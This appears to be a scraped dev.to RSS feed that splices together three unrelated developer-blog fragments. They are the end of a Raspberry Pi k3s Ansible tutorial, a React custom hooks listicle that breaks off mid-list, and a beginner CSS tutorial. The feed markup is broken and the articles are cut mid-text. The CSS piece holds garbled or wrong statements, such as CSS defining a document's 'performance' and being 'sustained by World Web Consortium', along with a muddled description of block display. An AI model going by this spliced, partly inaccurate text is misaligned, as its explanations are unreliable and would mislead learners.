&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1CXdNtkF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/bb872c572dedb1a2894597c50e238a37/5a190/k3s-rapsberrypi-ansible-automation-2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1CXdNtkF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/bb872c572dedb1a2894597c50e238a37/5a190/k3s-rapsberrypi-ansible-automation-2.png" alt="k3s-rapsberrypi-ansible-automation-2.png" title="k3s-rapsberrypi-ansible-automation-2.png" width="800" height="311"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can now SSH into the Pi master or nodes and run &lt;code&gt;kubectl&lt;/code&gt; commands within it.&lt;/p&gt;

&lt;p&gt;if you want to uninstall everything that got installed as part of the playbook:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;ansible-playbook reset.yml &lt;span class="nt"&gt;-i&lt;/span&gt; inventory/rpi-cluster/hosts.ini &lt;span class="nt"&gt;--ask-pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h3&gt;

&lt;p&gt;This article looked at how we can automate provisioning our Raspberry Pi with Ansible. If you are new to DevOps and want to automate provisioning systems, this is a great start. A special shoutout to &lt;a href="https://github.com/itwars"&gt;@itwars&lt;/a&gt; for putting this together and doing a lot of heavy lifting creating these scripts.&lt;/p&gt;

      <title>Custom Hooks to Lightweight Your React Project</title>
      <author>DhiWise</author>
      <pubDate>Wed, 15 Dec 2021 03:47:33 +0000</pubDate>
      <link>https://dev.to/dhiwise/custom-hooks-to-lightweight-your-react-project-g9j</link>
      <guid>https://dev.to/dhiwise/custom-hooks-to-lightweight-your-react-project-g9j</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--nKFPDda---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2800/0%2Aefj49Y4ARtOhLC0N" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--nKFPDda---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2800/0%2Aefj49Y4ARtOhLC0N" alt="React Custom Hooks" width="880" height="436"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hooks are the JavaScript functions that let you add additional functionality to the React apps without writing a class. React provides built-in hooks such as useState, useEffect, useContext and also facilitates you to create custom hooks.&lt;/p&gt;

&lt;p&gt;React hooks were introduced in React Version 16.8 and above and one of its main advantages is the reusability of stateful logic. Before the introduction of hooks, states can be maintained only in the class components but with the addition of hooks, states can now be maintained in the functional components without changing the component hierarchy.&lt;/p&gt;

&lt;p&gt;Let’s take a look at some useful custom hooks in React and understand how to use them in your project.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#usetheme"&gt;
  &lt;/a&gt;
  useTheme
&lt;/h2&gt;

&lt;p&gt;The useTheme hook helps you to dynamically change the appearance of your application using CSS variables. This can be done by simply passing an object containing the key/value pair of the CSS variables you would like to modify.&lt;/p&gt;

&lt;p&gt;The hook helps you to implement the light/dark components in your app.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Jaqa6xaR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/4028/1%2AbWsI6XCDWBLs2QTQmXTlOw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Jaqa6xaR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/4028/1%2AbWsI6XCDWBLs2QTQmXTlOw.png" alt="useTheme custom hook" width="880" height="793"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#useinput"&gt;
  &lt;/a&gt;
  useInput
&lt;/h2&gt;

&lt;p&gt;The useInput hook is used to simplify the handling of input events. Here is how you can install this custom hook.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--e0cI-NLc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2184/1%2AdqNkKiuammNRgAoRYgcNOg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--e0cI-NLc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2184/1%2AdqNkKiuammNRgAoRYgcNOg.png" alt="useInput hooks" width="880" height="896"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Check out the useInput sandbox example &lt;a href="https://codesandbox.io/s/useinput-forked-oxzxj?from-embed"&gt;here.&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#usekeybindings"&gt;
  &lt;/a&gt;
  &lt;strong&gt;useKeyBindings&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;useKeyBindings is used to bind pairs of keyboard events and handlers.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--P7Y4jRjH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2AvwY2vahVW9Mum21_U3oo7g.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--P7Y4jRjH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2AvwY2vahVW9Mum21_U3oo7g.png" alt="" width="880" height="637"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sandbox &lt;a href="https://codesandbox.io/s/usekeybindings-97ppz?from-embed"&gt;demo&lt;/a&gt; link.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#useonline"&gt;
  &lt;/a&gt;
  useOnline
&lt;/h2&gt;

&lt;p&gt;useOnline is the status hook used to detect whether the user is online or offline. The return value will be boolean(True or false).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8h2ichDQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2AeOGE9abzBVe7VVeB7Tbk5g.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8h2ichDQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2AeOGE9abzBVe7VVeB7Tbk5g.png" alt="useOnline hook" width="880" height="380"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sandbox &lt;a href="https://codesandbox.io/s/useonline-tiqdb?from-embed"&gt;demo&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#useprevious"&gt;
  &lt;/a&gt;
  usePrevious
&lt;/h2&gt;

&lt;p&gt;usePrevious hook enables you to access the previous value of a variable.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UlK9Gj03--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2A56QKqpoYXQ6-c8cCFv7KXQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UlK9Gj03--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/2708/1%2A56QKqpoYXQ6-c8cCFv7KXQ.png" alt="usePrevious hook" width="880" height="723"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sandbox &lt;a href="https://codesandbox.io/s/useprevious-uhjyr?from-embed"&gt;demo.&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#usewindowsize"&gt;
  &lt;/a&gt;
  useWindowSize
&lt;/h2&gt;

&lt;p&gt;The use WindowSize hook is used to return the window size that includes inner height and width and outer height and width.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vkRvMbpP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AcIdzfxBbrr4XBikQjp8Uwg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vkRvMbpP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AcIdzfxBbrr4XBikQjp8Uwg.png" alt="" width="880" height="737"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sandbox &lt;a href="https://codesandbox.io/s/usewindowsize-dkl83?from-embed"&gt;demo.&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#useasync"&gt;
  &lt;/a&gt;
  useAsync
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://github.com/streamich/react-use/blob/master/docs/useAsync.md"&gt;useAsync hook&lt;/a&gt; resolves async function or a function that returns a promise. Here is how we can use it.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uOMK5dCZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AUHTSqGVogiq7dXiY4si2fg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uOMK5dCZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/3288/1%2AUHTSqGVogiq7dXiY4si2fg.png" alt="useAsync hook" width="880" height="572"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#usepagevisibility"&gt;
  &lt;/a&gt;
  &lt;strong&gt;usePageVisibility&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;With the page Visibility hook, you can detect whether users are interacting with our website or not. It sends a visibility change event when the user lost focus on the page.&lt;/p&gt;

&lt;p&gt;So the hook can be used to,&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Pause a video on page has lost user focus&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Page title changed&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;To stop HTML canvas animation when the user is not on page&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Send notification or messages to the user on the page is active&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--u9dt5XAV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/x1ilhnh43v3nv8ci3u7x.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--u9dt5XAV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/x1ilhnh43v3nv8ci3u7x.jpg" alt="Introduction to CSS" width="880" height="616"&gt;&lt;/a&gt;In this post we'll see the basic controls of CSS. As we know CSS stands for Cascading Style Sheets. It is used to define the performance of the document which is written in a markup language like HTML. It does the work of division of performance and content which includes diverse layout, colors, and fonts. The separation gives flexibility and also controls the diverse properties which enable multiple web pages to share formatting by specifying proper CSS. The CSS terms are sustained by World Web Consortium. In addition to this, it also provides specific rules which help in another formatting if the content is being obtained from a mobile device. In our last tutorial we discussed &lt;a href="https://dev.to/elinabey/what-is-css-59p"&gt;What is CSS?&lt;/a&gt;.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#basic-css-controls"&gt;
  &lt;/a&gt;
  Basic CSS Controls.
&lt;/h1&gt;

&lt;p&gt;1.CSS Syntax:&lt;/p&gt;

&lt;p&gt;There are a set of rules that need to be followed in CSS Controls. The CSS rule-set consists of a selector and a declaration block. The selector is used to point to the HTML tags which users would like to style.&lt;/p&gt;

&lt;p&gt;2.Class Selector: &lt;br&gt;
To select a special class attribute the class selector is used to select the elements from that class. To make use of tags in a particular class a period (.) character is used. It is followed by the name of the class.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="nt"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;"class-selector"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;Class&lt;/span&gt; &lt;span class="nt"&gt;Selectors&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nc"&gt;.class-selector&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;3.Display:&lt;br&gt;
Many HTML elements are set to this mode of display. By default, the block-level elements take as much space and they cannot be placed on the same line with any other display mode.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="nt"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;"class-selector"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;Class&lt;/span&gt; &lt;span class="nt"&gt;Selectors&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nc"&gt;.class-selector&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;display&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;block&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;4.ID Selector: &lt;br&gt;
The id selector can use the id of an attribute of an HTML element and help in selecting a specific element.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;"class-selector"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;Class&lt;/span&gt; &lt;span class="nt"&gt;Selectors&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nf"&gt;#class-selector&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;5.Comments:&lt;br&gt;
This CSS Controls are desirable to be used when writing code. Comments are ignored by browsers&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;Comment&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c"&gt;/*This is a comment*/&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;6.Background Color: &lt;br&gt;
The background-color attribute determines the color which is to be set for the background of an element.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;"class-selector"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;This&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;background&lt;/span&gt; &lt;span class="nt"&gt;Color&lt;/span&gt; &lt;span class="nt"&gt;Green&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nf"&gt;#class-selector&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;green&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
